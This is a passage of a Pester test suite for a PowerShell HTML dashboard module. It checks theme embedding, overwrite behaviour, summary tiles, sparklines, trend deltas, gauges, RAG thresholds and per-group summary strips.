        $content = Get-Content $htmlPath -Raw
        $content | Should -Match 'Segoe UI'
        $content | Should -Match '#0078D4'
    }

    It 'Does not overwrite existing file without -Force' {
        $htmlPath = Join-Path $tmpDir 'test-no-overwrite.html'
        Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
        $before = (Get-Item $htmlPath).LastWriteTime
        Start-Sleep -Milliseconds 120
        Export-DhDashboard -Report $report -OutputPath $htmlPath   # no -Force
        $after = (Get-Item $htmlPath).LastWriteTime
        $after | Should -Be $before
    }

    It 'Overwrites existing file with -Force' {
        $htmlPath = Join-Path $tmpDir 'test-force-overwrite.html'
        Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
        $before = (Get-Item $htmlPath).LastWriteTime
        Start-Sleep -Milliseconds 120
        Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
        $after = (Get-Item $htmlPath).LastWriteTime
        $after | Should -BeGreaterThan $before
    }

    It 'HTML contains outLinks JSON when tables are linked' {
        $data2 = @([PSCustomObject]@{ Host = 'esx01'; VM = 'vm01' })
        Add-DhTable -Report $report -TableId 'vms' -Title 'VMs' -Data $data2
        Set-DhTableLink -Report $report -MasterTableId 'hosts' -DetailTableId 'vms' `
                      -MasterField 'Host' -DetailField 'Host'
        $htmlPath = Join-Path $tmpDir 'test-linked.html'
        Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
        $content = Get-Content $htmlPath -Raw
        $content | Should -Match '"outLinks"'
        $content | Should -Match 'link-badge-vms'
    }

    It 'HTML serialises string threshold Value key correctly' {
        $strThr = @(@{ Value='OK'; Class='cell-ok' }, @{ Value='Fail'; Class='cell-danger' })
        $cols   = @(@{ Field='Status'; Label='Status'; Thresholds=$strThr })
        $rThr   = New-DhDashboard -Title 'String Thr Test'
        Add-DhTable -Report $rThr -TableId 'st' -Title 'T' `
            -Data @([PSCustomObject]@{Status='OK'}) -Columns $cols
        $htmlPath = Join-Path $tmpDir 'test-string-threshold.html'
        Export-DhDashboard -Report $rThr -OutputPath $htmlPath -Force
        $content = Get-Content $htmlPath -Raw
        $content | Should -Match '"value":"OK"'
        $content | Should -Match '"value":"Fail"'
    }

    It 'HTML serialises PinFirst column property' {
        $cols = @(@{ Field='Name'; Label='N'; PinFirst=$true })
        $rPin = New-DhDashboard -Title 'PinFirst Test'
        Add-DhTable -Report $rPin -TableId 'pf' -Title 'T' `
            -Data @([PSCustomObject]@{Name='A'}) -Columns $cols
        $htmlPath = Join-Path $tmpDir 'test-pinfirst.html'
        Export-DhDashboard -Report $rPin -OutputPath $htmlPath -Force
        (Get-Content $htmlPath -Raw) | Should -Match '"pinFirst":true'
    }

    It 'HTML suppresses nav-title span when NavTitle is empty' {
        $rNt = New-DhDashboard -Title 'No Nav Title' -NavTitle ''
        Add-DhTable -Report $rNt -TableId 'nt' -Title 'T' `
            -Data @([PSCustomObject]@{X=1})
        $htmlPath = Join-Path $tmpDir 'test-navtitle-empty.html'
        Export-DhDashboard -Report $rNt -OutputPath $htmlPath -Force
        $content = Get-Content $htmlPath -Raw
        $content | Should -Not -Match 'class="nav-title"'
    }

    It 'HTML renders custom NavTitle in nav bar' {
        $rNt2 = New-DhDashboard -Title 'Full Title' -NavTitle 'Short'
        Add-DhTable -Report $rNt2 -TableId 'nt2' -Title 'T' `
            -Data @([PSCustomObject]@{X=1})
        $htmlPath = Join-Path $tmpDir 'test-navtitle-custom.html'
        Export-DhDashboard -Report $rNt2 -OutputPath $htmlPath -Force
        $content = Get-Content $htmlPath -Raw
        $content | Should -Match '>Short<'
        $content | Should -Not -Match '>Full Title<.*nav-title'
    }

    It 'HTML uses exportFileName for table config' {
        $rFn = New-DhDashboard -Title 'ExportFn Test'
        Add-DhTable -Report $rFn -TableId 'efn' -Title 'T' `
            -Data @([PSCustomObject]@{X=1}) -ExportFileName 'my-report-2026'
        $htmlPath = Join-Path $tmpDir 'test-exportfn.html'
        Export-DhDashboard -Report $rFn -OutputPath $htmlPath -Force
        (Get-Content $htmlPath -Raw) | Should -Match '"exportFileName":"my-report-2026"'
    }

    It 'HTML contains threshold config in TABLES_CONFIG when column thresholds are defined' {
        $thresholds = @(@{ Max = 70; Class = 'cell-ok' }, @{ Class = 'cell-danger' })
        $cols = @(@{ Field = 'CPU'; Label = 'CPU'; Thresholds = $thresholds })
        $rThr = New-DhDashboard -Title 'Threshold Test'
        Add-DhTable -Report $rThr -TableId 'thr' -Title 'T' -Data @([PSCustomObject]@{ CPU = 55 }) `
                        -Columns $cols
        $htmlPath = Join-Path $tmpDir 'test-thresholds.html'
        Export-DhDashboard -Report $rThr -OutputPath $htmlPath -Force
        (Get-Content $htmlPath -Raw) | Should -Match '"thresholds"'
    }

    It 'HTML contains charts config in TABLES_CONFIG when charts are defined' {
        $rChart = New-DhDashboard -Title 'Chart Test'
        Add-DhTable -Report $rChart -TableId 'ch' -Title 'T' `
                        -Data @([PSCustomObject]@{ Status = 'OK' }) `
                        -Charts @(@{ Title = 'Status'; Field = 'Status'; Type = 'pie' })
        $htmlPath = Join-Path $tmpDir 'test-charts.html'
        Export-DhDashboard -Report $rChart -OutputPath $htmlPath -Force
        $content = Get-Content $htmlPath -Raw
        $content | Should -Match '"charts"'
        $content | Should -Match 'charts-container'
    }

    It 'HTML always embeds both style blocks with data-theme attributes' {
        $r2 = New-DhDashboard -Title 'Dual' -Theme Default
        Add-DhTable -Report $r2 -TableId 'dt' -Title 'T' -Data @([PSCustomObject]@{ X = 1 })
        $htmlPath = Join-Path $tmpDir 'test-dual-theme.html'
        Export-DhDashboard -Report $r2 -OutputPath $htmlPath -Force
        $content = Get-Content $htmlPath -Raw
        $content | Should -Match 'id="theme-primary"'
        $content | Should -Match 'id="theme-alternate"'
        $content | Should -Match 'data-theme="DefaultLight"'
        $content | Should -Match 'data-theme="DefaultDark"'
        $content | Should -Match 'media="none"'
    }

    It 'Company theme: no external CSS file — CSS is self-contained in the HTML' {
        $r3 = New-DhDashboard -Title 'Dual2' -Theme Company
        Add-DhTable -Report $r3 -TableId 'dt2' -Title 'T' -Data @([PSCustomObject]@{ X = 1 })
        $htmlPath = Join-Path $tmpDir 'test-company-no-css.html'
        Export-DhDashboard -Report $r3 -OutputPath $htmlPath -Force
        # No companion CSS file should exist in the output directory
        $cssFile = Join-Path $tmpDir 'theme-css-company-light.css'
        Test-Path $cssFile | Should -Be $false
        # Both CSS variants embedded in the HTML
        $content = Get-Content $htmlPath -Raw
        $content | Should -Match '--company-crimson'   # CompanyLight CSS embedded
        $content | Should -Match '#0E0709'             # CompanyDark CSS embedded
    }

    It 'No external CSS file is ever written for any theme family' {
        foreach ($family in @('Default','Azure','VMware','Grey','Company')) {
            $r = New-DhDashboard -Title "T-$family" -Theme $family
            Add-DhTable -Report $r -TableId "t$family" -Title 'T' -Data @([PSCustomObject]@{ X = 1 })
            $htmlPath = Join-Path $tmpDir "test-no-css-$family.html"
            Export-DhDashboard -Report $r -OutputPath $htmlPath -Force
            $cssCount = @(Get-ChildItem -Path $tmpDir -Filter '*.css' -ErrorAction SilentlyContinue).Count
            $cssCount | Should -Be 0 -Because "theme '$family' must not produce external CSS"
        }
    }

    It 'Creates output directory if it does not exist' {
        $newDir   = Join-Path $tmpDir ('newsubdir_' + [guid]::NewGuid().ToString('N').Substring(0,8))
        $htmlPath = Join-Path $newDir 'report.html'
        Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
        Test-Path $htmlPath | Should -Be $true
    }
}

# ---------------------------------------------------------------------------
# Add-DhSummary
# ---------------------------------------------------------------------------
Describe 'Add-DhSummary' {

    BeforeEach {
        $script:report = New-DhDashboard -Title 'T'
    }

    It 'Stores summary tiles in report object' {
        Add-DhSummary -Report $report -Items @(
            @{ Label = 'Total'; Value = 42 }
        )
        $report['Summary'] | Should -Not -BeNullOrEmpty
        $report['Summary'].Count | Should -Be 1
        $report['Summary'][0].Label | Should -Be 'Total'
        $report['Summary'][0].Value | Should -Be 42
    }

    It 'Normalises optional fields with safe defaults' {
        Add-DhSummary -Report $report -Items @(
            @{ Label = 'X'; Value = 1 }
        )
        $tile = $report['Summary'][0]
        $tile['Icon']     | Should -Be ''
        $tile['SubLabel'] | Should -Be ''
        $tile['Class']    | Should -Be ''
        $tile['Format']   | Should -Be ''
        $tile['Decimals'] | Should -Be -1
        $tile['Currency'] | Should -Be ''
    }

    It 'Preserves explicit optional fields' {
        Add-DhSummary -Report $report -Items @(
            @{ Label='Cost'; Value=1234.5; Icon='💶'; Format='currency'; Locale='it-IT'; Currency='EUR'; Decimals=2; Class='cell-ok'; SubLabel='per month' }
        )
        $tile = $report['Summary'][0]
        $tile.Icon     | Should -Be '💶'
        $tile.Format   | Should -Be 'currency'
        $tile.Currency | Should -Be 'EUR'
        $tile.Decimals | Should -Be 2
        $tile.Class    | Should -Be 'cell-ok'
        $tile.SubLabel | Should -Be 'per month'
    }

    It 'Accepts multiple tiles' {
        Add-DhSummary -Report $report -Items @(
            @{ Label = 'A'; Value = 1 }
            @{ Label = 'B'; Value = 2 }
            @{ Label = 'C'; Value = 3 }
        )
        $report['Summary'].Count | Should -Be 3
    }

    It 'Warns when called a second time (replaces existing summary)' {
        Add-DhSummary -Report $report -Items @(@{ Label='First'; Value=1 })
        { Add-DhSummary -Report $report -Items @(@{ Label='Second'; Value=2 }) -WarningAction Stop } |
            Should -Throw
        $report['Summary'][0].Label | Should -Be 'Second'
    }

    It 'Throws when an item is missing Label key' {
        { Add-DhSummary -Report $report -Items @(@{ Value=1 }) } | Should -Throw
    }

    It 'Throws when an item is missing Value key' {
        { Add-DhSummary -Report $report -Items @(@{ Label='X' }) } | Should -Throw
    }

    It 'HTML contains SUMMARY_CONFIG with tile label' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_SumTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhSummary -Report $report -Items @(@{ Label='Total Servers'; Value=42 })
            $data = @([PSCustomObject]@{ X = 1 })
            Add-DhTable -Report $report -TableId 'tbl' -Title 'T' -Data $data
            $htmlPath = Join-Path $tmpDir2 'test-summary.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            (Get-Content $htmlPath -Raw) | Should -Match '"label":"Total Servers"'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    # ---- Sparkline (v1.4 F2) -------------------------------------------------
    It 'Sparkline defaults to empty when not supplied' {
        Add-DhSummary -Report $report -Items @(@{ Label='X'; Value=1 })
        # Hashtable access may unwrap an empty array to $null in PowerShell —
        # what matters is that there are no values to render.
        @($report['Summary'][0].Sparkline).Count | Should -Be 0
    }

    It 'Sparkline keeps numeric values in order' {
        Add-DhSummary -Report $report -Items @(
            @{ Label='X'; Value=1; Sparkline=@(12,18,15,22,19,24,31) }
        )
        $s = $report['Summary'][0]
        $s.Sparkline.Count | Should -Be 7
        $s.Sparkline[0]    | Should -Be 12
        $s.Sparkline[-1]   | Should -Be 31
    }

    It 'SparklineStyle defaults to line' {
        Add-DhSummary -Report $report -Items @(@{ Label='X'; Value=1; Sparkline=@(1,2,3) })
        $report['Summary'][0].SparklineStyle | Should -Be 'line'
    }

    It 'SparklineStyle accepts area and bars' {
        Add-DhSummary -Report $report -Items @(
            @{ Label='A'; Value=1; Sparkline=@(1,2); SparklineStyle='area' }
            @{ Label='B'; Value=2; Sparkline=@(1,2); SparklineStyle='bars' }
        )
        $report['Summary'][0].SparklineStyle | Should -Be 'area'
        $report['Summary'][1].SparklineStyle | Should -Be 'bars'
    }

    It 'Rejects invalid SparklineStyle' {
        { Add-DhSummary -Report $report -Items @(
            @{ Label='X'; Value=1; Sparkline=@(1,2); SparklineStyle='waveform' }
        ) } | Should -Throw
    }

    It 'SparklineMin / SparklineMax stored as numbers' {
        Add-DhSummary -Report $report -Items @(
            @{ Label='X'; Value=1; Sparkline=@(1,2,3); SparklineMin=0; SparklineMax=100 }
        )
        $report['Summary'][0].SparklineMin | Should -Be 0
        $report['Summary'][0].SparklineMax | Should -Be 100
    }

    It 'SparklineMin / SparklineMax default to null when not supplied' {
        Add-DhSummary -Report $report -Items @(@{ Label='X'; Value=1; Sparkline=@(1,2) })
        $report['Summary'][0].SparklineMin | Should -BeNullOrEmpty
        $report['Summary'][0].SparklineMax | Should -BeNullOrEmpty
    }

    It 'Throws on non-numeric SparklineMin' {
        { Add-DhSummary -Report $report -Items @(
            @{ Label='X'; Value=1; Sparkline=@(1,2); SparklineMin='zero' }
        ) } | Should -Throw
    }

    It 'Drops non-numeric Sparkline values (with warning)' {
        Add-DhSummary -Report $report -Items @(
            @{ Label='X'; Value=1; Sparkline=@(1,'bogus',3) }
        ) -WarningAction SilentlyContinue
        $report['Summary'][0].Sparkline.Count | Should -Be 2
        $report['Summary'][0].Sparkline       | Should -Be @(1, 3)
    }

    # ---- Trend / delta indicator (v1.4 F1) -----------------------------------
    It 'Previous defaults to null when not supplied' {
        Add-DhSummary -Report $report -Items @(@{ Label='X'; Value=1 })
        $report['Summary'][0].Previous | Should -BeNullOrEmpty
    }

    It 'Previous stored as a number when supplied' {
        Add-DhSummary -Report $report -Items @(@{ Label='X'; Value=231; Previous=219 })
        $report['Summary'][0].Previous | Should -Be 219
    }

    It 'Throws when Previous is non-numeric' {
        { Add-DhSummary -Report $report -Items @(@{ Label='X'; Value=1; Previous='nope' }) } | Should -Throw
    }

    It 'Trend defaults to auto' {
        Add-DhSummary -Report $report -Items @(@{ Label='X'; Value=1 })
        $report['Summary'][0].Trend | Should -Be 'auto'
    }

    It 'Trend accepts up / down / flat' {
        Add-DhSummary -Report $report -Items @(
            @{ Label='A'; Value=1; Trend='up' }
            @{ Label='B'; Value=2; Trend='down' }
            @{ Label='C'; Value=3; Trend='flat' }
        )
        $report['Summary'][0].Trend | Should -Be 'up'
        $report['Summary'][1].Trend | Should -Be 'down'
        $report['Summary'][2].Trend | Should -Be 'flat'
    }

    It 'Rejects invalid Trend' {
        { Add-DhSummary -Report $report -Items @(@{ Label='X'; Value=1; Trend='sideways' }) } | Should -Throw
    }

    It 'TrendIsGood stays nullable (semantic default in JS)' {
        Add-DhSummary -Report $report -Items @(@{ Label='X'; Value=1 })
        $report['Summary'][0].TrendIsGood | Should -BeNullOrEmpty
    }

    It 'TrendIsGood preserved when explicitly true / false' {
        Add-DhSummary -Report $report -Items @(
            @{ Label='A'; Value=1; TrendIsGood=$true  }
            @{ Label='B'; Value=2; TrendIsGood=$false }
        )
        $report['Summary'][0].TrendIsGood | Should -Be $true
        $report['Summary'][1].TrendIsGood | Should -Be $false
    }

    It 'DeltaFormat defaults to both' {
        Add-DhSummary -Report $report -Items @(@{ Label='X'; Value=1 })
        $report['Summary'][0].DeltaFormat | Should -Be 'both'
    }

    It 'DeltaFormat accepts percent / absolute / both' {
        Add-DhSummary -Report $report -Items @(
            @{ Label='A'; Value=1; DeltaFormat='percent'  }
            @{ Label='B'; Value=2; DeltaFormat='absolute' }
            @{ Label='C'; Value=3; DeltaFormat='both'     }
        )
        $report['Summary'][0].DeltaFormat | Should -Be 'percent'
        $report['Summary'][1].DeltaFormat | Should -Be 'absolute'
        $report['Summary'][2].DeltaFormat | Should -Be 'both'
    }

    It 'Rejects invalid DeltaFormat' {
        { Add-DhSummary -Report $report -Items @(@{ Label='X'; Value=1; DeltaFormat='ratio' }) } | Should -Throw
    }

    It 'HTML omits delta keys when neither Previous nor explicit Trend supplied' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_DeltaTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhSummary -Report $report -Items @(@{ Label='Plain'; Value=42 })
            $data = @([PSCustomObject]@{ X = 1 })
            Add-DhTable -Report $report -TableId 'tbl' -Title 'T' -Data $data
            $htmlPath = Join-Path $tmpDir2 'test-no-delta.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"label":"Plain"'
            $content | Should -Not -Match '"label":"Plain"[^}]*"previous":'
            $content | Should -Not -Match '"label":"Plain"[^}]*"trend":'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    It 'Preserves decimal precision regardless of system locale (TryParse uses Invariant)' {
        # Regression test for the bug where Previous=92330.25 became 9233025
        # on it-IT systems because TryParse used CurrentCulture and treated
        # the period as a thousands separator.
        Add-DhSummary -Report $report -Items @(
            @{ Label='Revenue';     Value=99450.75; Previous=92330.25 }
            @{ Label='Conversions'; Value=58.4;     Previous=55.2 }
        )
        $report['Summary'][0].Previous | Should -Be 92330.25
        $report['Summary'][1].Previous | Should -Be 55.2
    }

    It 'HTML contains delta keys when Previous supplied' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_DeltaTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhSummary -Report $report -Items @(
                @{ Label='Active'; Value=231; Previous=219 }
                @{ Label='Errors'; Value=4;   Previous=12;  TrendIsGood=$true; DeltaFormat='absolute' }
            )
            $data = @([PSCustomObject]@{ X = 1 })
            Add-DhTable -Report $report -TableId 'tbl' -Title 'T' -Data $data
            $htmlPath = Join-Path $tmpDir2 'test-with-delta.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"previous":219'
            $content | Should -Match '"trend":"auto"'
            $content | Should -Match '"trendIsGood":null'
            $content | Should -Match '"deltaFormat":"both"'
            # Inverted-good tile
            $content | Should -Match '"previous":12'
            $content | Should -Match '"trendIsGood":true'
            $content | Should -Match '"deltaFormat":"absolute"'
            # JS DELTA helper is embedded
            $content | Should -Match 'var DELTA\s*=\s*\{'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    # ---- Tile styles bignumber / gauge (v1.4 F3 + F4) ------------------------
    It 'Style defaults to tile' {
        Add-DhSummary -Report $report -Items @(@{ Label='X'; Value=1 })
        $report['Summary'][0].Style | Should -Be 'tile'
    }

    It 'Style accepts bignumber and gauge' {
        Add-DhSummary -Report $report -Items @(
            @{ Style='bignumber'; Label='SLA';  Value='99.97%' }
            @{ Style='gauge';     Label='Disk'; Value=73 }
        )
        $report['Summary'][0].Style | Should -Be 'bignumber'
        $report['Summary'][1].Style | Should -Be 'gauge'
    }

    It 'Rejects invalid Style' {
        { Add-DhSummary -Report $report -Items @(@{ Style='hexagon'; Label='X'; Value=1 }) } | Should -Throw
    }

    It 'Bignumber preserves Caption when supplied' {
        Add-DhSummary -Report $report -Items @(
            @{ Style='bignumber'; Label='SLA'; Value='99.97%'; Caption='Target 99.9% — met' }
        )
        $report['Summary'][0].Caption | Should -Be 'Target 99.9% — met'
    }

    It 'Gauge defaults Min=0 / Max=100' {
        Add-DhSummary -Report $report -Items @(@{ Style='gauge'; Label='Disk'; Value=73 })
        $report['Summary'][0].Min | Should -Be 0
        $report['Summary'][0].Max | Should -Be 100
    }

    It 'Gauge respects custom Min / Max' {
        Add-DhSummary -Report $report -Items @(
            @{ Style='gauge'; Label='Cluster CPU'; Value=42; Min=0; Max=80 }
        )
        $report['Summary'][0].Min | Should -Be 0
        $report['Summary'][0].Max | Should -Be 80
    }

    It 'Gauge throws when Value is not numeric' {
        { Add-DhSummary -Report $report -Items @(@{ Style='gauge'; Label='X'; Value='abc' }) } | Should -Throw
    }

    It 'Gauge stores threshold list with Min/Max/Class' {
        Add-DhSummary -Report $report -Items @(
            @{ Style='gauge'; Label='Disk'; Value=73
               Thresholds=@(
                   @{ Min=0;  Class='cell-ok'     }
                   @{ Min=70; Class='cell-warn'   }
                   @{ Min=90; Class='cell-danger' }
               )
            }
        )
        $thr = $report['Summary'][0].Thresholds
        @($thr).Count | Should -Be 3
        $thr[0].Class | Should -Be 'cell-ok'
        $thr[1].Min   | Should -Be 70
        $thr[2].Class | Should -Be 'cell-danger'
    }

    It 'Gauge throws when threshold lacks Class' {
        { Add-DhSummary -Report $report -Items @(
            @{ Style='gauge'; Label='X'; Value=1
               Thresholds=@(@{ Min=0 })
            }
        ) } | Should -Throw
    }

    # ---- Unified -Rag parameter (v1.4 F13) -----------------------------------
    It 'Rag hashtable converts to Min/Max/Class threshold array' {
        Add-DhSummary -Report $report -Items @(
            @{ Style='gauge'; Label='CPU'; Value=42; Max=100
               Rag=@{
                   Green = @{ Max=70 }
                   Amber = @{ Min=70; Max=90 }
                   Red   = @{ Min=90 }
               }
            }
        )
        $thr = $report['Summary'][0].Thresholds
        @($thr).Count | Should -Be 3
        $thr[0].Class | Should -Be 'cell-ok'
        $thr[0].Max   | Should -Be 70
        $thr[1].Class | Should -Be 'cell-warn'
        $thr[1].Min   | Should -Be 70
        $thr[1].Max   | Should -Be 90
        $thr[2].Class | Should -Be 'cell-danger'
        $thr[2].Min   | Should -Be 90
        # Rag key is consumed and not echoed back
        $report['Summary'][0].Contains('Rag') | Should -Be $false
    }

    It 'Rag stores RagNoData flag when NoData=$true' {
        Add-DhSummary -Report $report -Items @(
            @{ Style='gauge'; Label='X'; Value=1
               Rag=@{ Green=@{Max=50}; Red=@{Min=50}; NoData=$true }
            }
        )
        $report['Summary'][0].RagNoData | Should -Be $true
    }

    It 'Rag wins over a legacy Thresholds array on the same item' {
        Add-DhSummary -Report $report -Items @(
            @{ Style='gauge'; Label='X'; Value=80
               Thresholds=@(
                   @{ Min=0;  Max=100; Class='cell-danger' }   # legacy — should be discarded
               )
               Rag=@{ Green=@{Max=70}; Amber=@{Min=70;Max=90}; Red=@{Min=90} }
            }
        )
        $thr = $report['Summary'][0].Thresholds
        @($thr).Count | Should -Be 3
        $thr[1].Class | Should -Be 'cell-warn'   # 80 falls in amber band
    }

    It 'Rag rejects unknown top-level key' {
        { Add-DhSummary -Report $report -Items @(
            @{ Style='gauge'; Label='X'; Value=1
               Rag=@{ Yellow=@{Max=70} }
            }
        ) } | Should -Throw
    }

    It 'Rag rejects unknown band-level key' {
        { Add-DhSummary -Report $report -Items @(
            @{ Style='gauge'; Label='X'; Value=1
               Rag=@{ Green=@{ Average=70 } }
            }
        ) } | Should -Throw
    }

    It 'Gauge accepts null Value when Rag NoData=$true (renderer paints cell-nodata)' {
        Add-DhSummary -Report $report -Items @(
            @{ Style='gauge'; Label='Feed'; Value=$null; Max=100
               Rag=@{ Green=@{Max=70}; Red=@{Min=70}; NoData=$true }
            }
        )
        $report['Summary'][0].RagNoData | Should -Be $true
    }

    It 'Gauge still rejects null Value when Rag NoData is NOT set' {
        { Add-DhSummary -Report $report -Items @(
            @{ Style='gauge'; Label='Feed'; Value=$null; Max=100
               Rag=@{ Green=@{Max=70}; Red=@{Min=70} }   # no NoData=$true
            }
        ) } | Should -Throw
    }

    It 'Rag rejects non-numeric band bounds' {
        { Add-DhSummary -Report $report -Items @(
            @{ Style='gauge'; Label='X'; Value=1
               Rag=@{ Green=@{ Max='seventy' } }
            }
        ) } | Should -Throw
    }

    It 'HTML contains style key + bignumber caption + gauge thresholds' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_StyleTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhSummary -Report $report -Items @(
                @{ Label='Total'; Value=42 }
                @{ Style='bignumber'; Label='SLA'; Value='99.97%'; Caption='Target 99.9% — met' }
                @{ Style='gauge'; Label='Disk used'; Value=73; Max=100; Unit='%'
                   Thresholds=@(
                       @{ Min=0;  Class='cell-ok'     }
                       @{ Min=70; Class='cell-warn'   }
                       @{ Min=90; Class='cell-danger' }
                   )
                }
            )
            $data = @([PSCustomObject]@{ X = 1 })
            Add-DhTable -Report $report -TableId 'tbl' -Title 'T' -Data $data
            $htmlPath = Join-Path $tmpDir2 'test-styles.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            # Style field on all three tiles
            $content | Should -Match '"label":"Total"[^}]*"style":"tile"'
            $content | Should -Match '"label":"SLA"[^}]*"style":"bignumber"'
            $content | Should -Match '"label":"Disk used"[^}]*"style":"gauge"'
            # Bignumber caption present (escaped em-dash)
            $content | Should -Match '"caption":"Target 99\.9% — met"'
            # Gauge fields present
            $content | Should -Match '"label":"Disk used"[^}]*"min":0,"max":100,"unit":"%"'
            $content | Should -Match '"min":70,"class":"cell-warn"'
            $content | Should -Match '"min":90,"class":"cell-danger"'
            # JS renderers present
            $content | Should -Match 'function buildBignumberTile'
            $content | Should -Match 'function buildGaugeTile'
            $content | Should -Match 'function pickThresholdClass'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    # ---- Per-NavGroup summary strips (v1.4.1) --------------------------------
    It 'Without -NavGroup the strip goes to $Report.Summary (legacy path)' {
        Add-DhSummary -Report $report -Items @(@{ Label='X'; Value=1 })
        @($report['Summary']).Count | Should -Be 1
        # No summarystrip block created
        if ($report.Contains('Blocks')) {
            ($report['Blocks'] | Where-Object { $_.BlockType -eq 'summarystrip' }) | Should -BeNullOrEmpty
        }
    }

    It 'With -NavGroup the strip lives in $Report.Blocks (not Summary)' {
        Add-DhSummary -Report $report -NavGroup 'Identity' -Items @(
            @{ Label='Active users'; Value=231 }
        )
        # Legacy Summary untouched
        if ($report.Contains('Summary')) { @($report['Summary']).Count | Should -Be 0 }
        # Block emitted instead
        $b = $report['Blocks'] | Where-Object { $_.BlockType -eq 'summarystrip' } | Select-Object -First 1
        $b              | Should -Not -BeNullOrEmpty
        $b.NavGroup     | Should -Be 'Identity'
        $b.Id           | Should -Be 'summary-identity'   # auto-derived slug
        @($b.Items).Count | Should -Be 1
        $b.Items[0].Label | Should -Be 'Active users'
    }

    It 'NavSubGroup carries through and is part of the auto Id' {
        Add-DhSummary -Report $report -NavGroup 'Identity' -NavSubGroup 'Production' -Items @(
            @{ Label='X'; Value=1 }
        )
        $b = $report['Blocks'][0]
        $b.NavSubGroup | Should -Be 'Production'
        $b.Id          | Should -Be 'summary-identity-production'
    }

    It 'Auto Id slugifies spaces and uppercase' {
        Add-DhSummary -Report $report -NavGroup 'My Big Group' -Items @(@{ Label='X'; Value=1 })
        $report['Blocks'][0].Id | Should -Be 'summary-my-big-group'
    }

    It 'Explicit -Id overrides the auto-derived value' {
        Add-DhSummary -Report $report -NavGroup 'Identity' -Id 'kpi-overview' -Items @(
            @{ Label='X'; Value=1 }
        )
        $report['Blocks'][0].Id | Should -Be 'kpi-overview'
    }

    It 'Multiple per-group summaries coexist' {
        Add-DhSummary -Report $report -NavGroup 'Identity'       -Items @(@{ Label='Users'; Value=231 })
        Add-DhSummary -Report $report -NavGroup 'Infrastructure' -Items @(@{ Label='Hosts'; Value=42  })
        Add-DhSummary -Report $report -NavGroup 'Finance'        -Items @(@{ Label='MRR';   Value=1.2e6 })
        @($report['Blocks'] | Where-Object { $_.BlockType -eq 'summarystrip' }).Count | Should -Be 3
    }

    It 'Throws on duplicate auto-Id (same NavGroup + NavSubGroup twice)' {
        Add-DhSummary -Report $report -NavGroup 'Identity' -Items @(@{ Label='X'; Value=1 })
        { Add-DhSummary -Report $report -NavGroup 'Identity' -Items @(@{ Label='Y'; Value=2 }) } | Should -Throw
    }

    It 'Per-group strip can coexist with a global top-of-page strip' {
        Add-DhSummary -Report $report -Items @(@{ Label='Global';  Value=1 })   # legacy
        Add-DhSummary -Report $report -NavGroup 'Identity' -Items @(@{ Label='Per-group'; Value=2 })
        @($report['Summary']).Count                                          | Should -Be 1
        @($report['Blocks'] | Where-Object { $_.BlockType -eq 'summarystrip' }).Count | Should -Be 1
    }

    It 'HTML emits summarystrip block with items + NavGroup' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_SummaryNav_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhSummary -Report $report -NavGroup 'Identity' -Title 'Identity KPIs' -Items @(
                @{ Style='bignumber'; Label='Active users';  Value=231;   Caption='Last 24h'; Class='cell-ok' }
                @{                    Label='Failed logins'; Value=842;   Previous=920; TrendIsGood=$true }
                @{ Style='gauge';     Label='Auth latency';  Value=42;    Max=120; Unit='ms'
                   Rag=@{ Green=@{Max=50}; Amber=@{Min=50;Max=80}; Red=@{Min=80} } }
            )
            $data = @([PSCustomObject]@{ X = 1 })
            Add-DhTable -Report $report -TableId 'tbl' -Title 'T' -Data $data -NavGroup 'Identity'
            $htmlPath = Join-Path $tmpDir2 'test-summarystrip.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"blockType":"summarystrip"'
            $content | Should -Match '"label":"Active users"'
            $content | Should -Match '"style":"bignumber"'
            $content | Should -Match '"caption":"Last 24h"'
            $content | Should -Match '"previous":920'
            $content | Should -Match '"trendIsGood":true'
            $content | Should -Match '"style":"gauge"'
            $content | Should -Match '"unit":"ms"'
            $content | Should -Match 'function renderSummaryStrip'
            # Block-section emitted with data-navgroup so nav routing hides/shows it
            $content | Should -Match 'id="bsection-summary-identity"[^>]*data-navgroup="Identity"'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    # ---- Per-tile Action (v1.4.2) --------------------------------------------
    It 'Tile Action defaults to null when not supplied' {
        Add-DhSummary -Report $report -Items @(@{ Label='X'; Value=1 })
        $report['Summary'][0].Action | Should -BeNullOrEmpty
    }

    It 'Tile Action with TableId is stored' {
        Add-DhSummary -Report $report -Items @(
